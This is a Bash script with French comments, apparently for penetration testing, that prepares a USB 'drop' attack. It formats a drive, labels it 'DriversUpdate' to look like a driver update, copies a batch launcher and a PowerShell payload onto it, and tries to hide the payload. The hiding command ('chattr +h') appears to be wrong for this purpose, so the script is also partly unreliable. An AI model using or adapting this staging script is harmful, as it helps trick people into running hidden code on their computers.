# create_usb.sh
# Script Bash pour formater une clé USB en FAT32 et copier le payload Windows

#!/bin/bash

DEVICE="/dev/sdX"  # <-- à modifier avec votre périphérique USB
MOUNT_POINT="/mnt/usb-pentest"

echo "[*] Formattage de la clé USB ($DEVICE) en FAT32..."
sudo umount ${DEVICE}* 2>/dev/null
sudo mkfs.vfat -F 32 -n "DriversUpdate" $DEVICE

echo "[*] Montage de la clé USB..."
sudo mkdir -p "$MOUNT_POINT"
sudo mount $DEVICE $MOUNT_POINT

echo "[*] Copie du payload..."
sudo cp runme.bat "$MOUNT_POINT/"
sudo cp payload.ps1 "$MOUNT_POINT/"

# Optionnel : cacher le vrai script PowerShell
sudo chattr +h "$MOUNT_POINT/payload.ps1"

echo "[*] Nettoyage..."
sudo sync
sudo umount $MOUNT_POINT
sudo rm -r $MOUNT_POINT

echo "[*] La clé USB est prête !"
